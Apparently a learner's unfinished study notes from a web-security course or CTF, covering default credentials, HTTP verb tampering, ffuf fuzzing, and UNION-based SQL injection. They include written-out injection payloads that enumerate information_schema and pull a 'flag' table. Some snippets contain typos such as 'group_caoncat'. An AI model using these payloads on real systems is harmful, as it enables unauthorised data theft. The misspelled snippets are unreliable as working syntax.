---
title: test4 with obisidan
description: desc
pubDate: 2026-08-08
---
## Security Misconfiguration
- Default credential:
	- vendor supplied: admin -> admin
	- brute force
	- password spray -> Pass -> 1000 users
- stack trace: get error from web -> put Chinese characters in input

> [!NOTE]
> challenge arrival?

- verb tamper: change http method -> change GET / to  POST, PUT, PATCH

> [!NOTE]
> verb tamper video yt
> https://www.youtube.com/watch?v=IRp0LurK23s

- Force Browsing:
	- Fuzzing: many inputs -> watch outputs
		- ffuf
			- `ffuf -w raft*.txt -mc all -fw 28 -u url/FUZZ -t 1 -p 0.5 -x http://127.0.0.1:8080`  -> t=thread & p=delays between requests & x=proxy
			- 

- tasks:
	- PHP CMS
	- Fuzz Me
	- Real Miss
	- Travel → bonus
### Notices:
**Arrival solution**
**application security 11h**
https://www.youtube.com/watch?v=IRp0LurK23s verb tamper video


## SQLi
#### simplest SQLi
altering SQL query
- break out the context with single or double quote and (fix the query)
	- two single quotes can skip and escape next single quote, means like `/`. again means ` ' '` turn to `'` in real. (string single quote) ----> ==mamad'#== --> ==admin'#== ---> ==' or 1=1#==
	- hashtag # can comment errors after syntax. 
#### Interactions
- Direct result --> text apears directly in database --> exploited bey UNION
- Indirect results ----> the small effect of data, not the exact one ----- > works with blind SQLi 
  (boolean based)
- No result ----> (time based)
#### Exploitation flow
- ##### Data Extraction
	- Database name
	- Table name
	- Column name
	- Pulling out Data
- But HOw?
	- `select schema_name from information_schema.schemata` -> all database name which the user has access to
	- `select table_name  from information_schema.tables` -> all tables name which the user has access to
	- `select column_name from information_schema.columns` -> all columns name which the user has access to
- #### Union Based Injection --> first interaction  (Direct)
	- Detection (if ==1=2 !=3==, we has SQLi)
		1. default
		2. true condition
			1. we should test these:
				```
				page/?id=54 order by 1
				page/?id=54' order by 1#
				page/?id=54" order by 1#
				```
				for these #, if we had error and syntax error, we should fix it (by for example put %23 instead of #(it is reserved character. because sometimes # does not even send to server)
		3. false condition
			1. we should test these:
				```
				page/?id=54 order by 1000
				page/?id=54' order by 1000#
				page/?id=54" order by 1000#
				```

> [!warning]
> 		the meaning of `order by 1`? ---> ordered by column 1
where we INJECT?
> 		---> `select HERE from table where id = 'INJECT'`

> [!NOTE]
> why we need columns ---> for union
> `page/?id=54' union select 1,2,3,4,5,6,7,8,9,10%23`

- sometimes we can not results of selection of some column in page because developer just shows one select in page ( like by ==fetch_assoc()==)
- but we can show it by changing id umber to anything that not exist, means `page/?id=354354' union select 1,2,3,4,5,6,7,8,9,10%23`
- accessed to user name by `union select 1,user(),3,4,5,6,7,8,9,10  from information_schema.schemata` ??????? why user()? because of source code that we have?
- ``union select 1,group_caoncat(SCHEMA_NAME),3,4,5,6,7,8,9,10  from information_schema.schemata`` ---> use it for driving all database names in page we can see.
- ``union select 1,group_caoncat(table_name),3,4,5,6,7,8,9,10 from information_schema.tables`` ---> this give us all tables but we can filter it with where like this:
   `union select 1,group_caoncat(table_name),3,4,5,6,7,8,9,10 from information_schema.tables where table_schema=database()`   --> `database()` means this database that we use without ention name of it
- `union select 1,group_caoncat(column_name),3,4,5,6,7,8,9,10 from information_schema.columns where table_schema=database() and table_name='flag'`
- `page/?id=1.1' union select 1,flag_text,3,4,5,6,7,8,9,10 from flag%23`
- #### Blind SQLi
	- 

## Command Injection
## Remote Code Execution
## Server Side Template Injection

